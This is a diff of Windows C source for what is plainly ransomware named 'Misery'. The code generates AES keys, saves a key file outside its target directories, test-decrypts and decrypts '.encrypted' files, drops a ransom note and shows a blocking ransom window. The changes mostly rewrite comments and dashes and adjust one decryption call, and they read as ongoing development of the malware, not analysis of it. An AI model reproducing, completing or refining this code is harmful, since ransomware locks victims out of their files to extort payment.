@@ -27,10 +27,9 @@ const char *g_target_dirs[] = {
     NULL
 };
 
-/* ===================================================================
- * FIX: Generate 32 cryptographically random bytes using CryptoAPI.
- * This is a true 256-bit key, not a 119-bit alphanumeric password.
- * =================================================================== */
+
+ // Generate 32 cryptographically random bytes using CryptoAPI.
+ 
 static void GenerateRawKey(BYTE *key, DWORD keySize) {
     HCRYPTPROV hProv = 0;
     if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
@@ -38,29 +37,28 @@ static void GenerateRawKey(BYTE *key, DWORD keySize) {
         CryptReleaseContext(hProv, 0);
         return;
     }
-    /* Extreme fallback — should never reach here on Windows */
+    /* Extreme fallback – should never reach here on Windows */
     HCRYPTPROV hProv2 = 0;
     CryptAcquireContextA(&hProv2, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
     CryptGenRandom(hProv2, keySize, key);
     CryptReleaseContext(hProv2, 0);
 }
 
-/* ===================================================================
- * FIX: Save key file in clean hex format to a location OUTSIDE all
- * target directories. The file is human-readable and won't be
- * matched by the file traversal (saved outside target dirs).
+/*
+ Save key file in clean hex format to a location OUTSIDE all
+ * target directories.
  *
  * Format:
  *   <32 hex chars for salt>
  *   <64 hex chars for key>
- * =================================================================== */
+ * */
 static bool SaveKeyFile(const BYTE *rawKey, DWORD keyLen, const BYTE *salt) {
     int savedCount = 0;
     char saltHex[33], keyHex[65];
     bytes_to_hex(salt, SALT_SIZE, saltHex);
     bytes_to_hex(rawKey, keyLen, keyHex);
 
-    /* Location 1: %TEMP% — guaranteed outside all target dirs */
+    /* Location 1: %TEMP% – guaranteed outside all target dirs */
     char tempPath[MAX_PATH];
     if (GetTempPathA(MAX_PATH, tempPath)) {
         char keyPath[MAX_PATH * 2];
@@ -88,7 +86,7 @@ static bool SaveKeyFile(const BYTE *rawKey, DWORD keyLen, const BYTE *salt) {
         }
     }
 
-    /* Location 3: CWD — with IsKeyFilePath exclusion in fileops */
+    /* Location 3: CWD – with IsKeyFilePath exclusion in fileops */
     char cwd[MAX_PATH];
     if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
         /* Skip if CWD is same as Desktop or TEMP (avoid duplicate) */
@@ -216,7 +214,7 @@ static bool FindFirstEncryptedFileAndSalt(BYTE *outSalt, char *outPath,
  *   1. Parse hex key string to 32 raw bytes
  *   2. Find first .encrypted file recursively, extract salt
  *   3. Initialize crypto with key + extracted salt
- *   4. Test-decrypt one file — if HMAC fails, key is WRONG → return false
+ *   4. Test-decrypt one file – if HMAC fails, key is WRONG → return false
  *   5. Run full FileOps decrypt on all target directories
  * =================================================================== */
 bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
@@ -280,19 +278,19 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
         bytes_to_hex(ctx_salt, SALT_SIZE, saltDbg);
         MiseryLog(MISERY_LOG_INFO, "Decrypt: Using salt=%s from file: %s",
                   saltDbg, testEncPath);
-        
+
         /* Also log the extracted salt from the encrypted file for comparison */
         char extractedSalt[33];
         bytes_to_hex(salt, SALT_SIZE, extractedSalt);
         MiseryLog(MISERY_LOG_INFO, "Decrypt: Extracted salt from file=%s (match: %s)",
                   extractedSalt, (strcmp(saltDbg, extractedSalt) == 0) ? "YES" : "NO");
-        
+
         /* Note: Deriving a hash from the AES key requires additional crypto operations.
            For now, the salt match and successful test-decrypt below serve as verification. */
     }
 
     /* FIX: Verify key by test-decrypting one file.
-     * If HMAC doesn't match, the key is WRONG — return false immediately. */
+     * If HMAC doesn't match, the key is WRONG – return false immediately. */
     HANDLE hTest = CreateFileA(testEncPath, GENERIC_READ, FILE_SHARE_READ,
                                 NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hTest == INVALID_HANDLE_VALUE) {
@@ -311,10 +309,10 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
                 if (ReadFile(hTest, testBuf, fs, &rd, NULL) && rd == fs) {
                     DWORD outLen = 0;
                     cerr = DecryptBuffer(GetCryptoCtx(), testBuf, fs,
-                                         testOut, &outLen, fs);
+                                         testOut, &outLen);
                     if (cerr != CRYPTO_SUCCESS) {
                         MiseryLog(MISERY_LOG_ERROR,
-                                  "Decrypt: Test-decrypt FAILED: %s — WRONG KEY!",
+                                  "Decrypt: Test-decrypt FAILED: %s – WRONG KEY!",
                                   GetErrorString(cerr));
                         VirtualFree(testBuf, 0, MEM_RELEASE);
                         VirtualFree(testOut, 0, MEM_RELEASE);
@@ -333,7 +331,7 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
         CloseHandle(hTest);
     }
 
-    /* Key is valid — run full decryption */
+    /* Key is valid – run full decryption */
     FILEOPS_CONFIG cfg = {0};
     cfg.threadCount   = 8;
     cfg.ioBufferSize  = (64 * 1024);
@@ -365,7 +363,7 @@ bool MiseryRunDecrypt(const char *keyHex, FILEOPS_STATS *outStats) {
     FILEOPS_STATS stats;
     FileOps_GetStats(fctx, &stats);
     MiseryLog(MISERY_LOG_INFO,
-              "Decrypt: Complete — %lld OK, %lld failed, %lld bytes",
+              "Decrypt: Complete – %lld OK, %lld failed, %lld bytes",
               stats.filesSucceeded, stats.filesFailed, stats.bytesProcessed);
 
     FileOps_DestroyContext(fctx);
@@ -495,7 +493,7 @@ static bool ExecutePhaseRansomNote(void) {
         UtilsDropRansomNote(note_path, note_content);
     }
 
-    /* Show GUI window — BLOCKING */
+    /* Show GUI window – BLOCKING */
     ShowRansomNoteWindow();
 
     return MiseryPhaseTransition(PHASE_RANSOM_NOTE, true);
@@ -525,7 +523,7 @@ int main(int argc, char **argv) {
 
     if (decryptmode) {
         /* ============================================================
-         * FIX: DECRYPT MODE — parse hex key file
+         * FIX: DECRYPT MODE – parse hex key file
          * ============================================================ */
         MiseryLog(MISERY_LOG_INFO, "Mode: COMMAND-LINE DECRYPT");
 
@@ -587,7 +585,7 @@ int main(int argc, char **argv) {
                       "Decrypt: %lld files decrypted, %lld failed",
                       stats.filesSucceeded, stats.filesFailed);
         } else {
-            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed — wrong key or corrupt data");
+            MiseryLog(MISERY_LOG_ERROR, "Decrypt: Failed – wrong key or corrupt data");
         }
 
         CleanupCrypto();
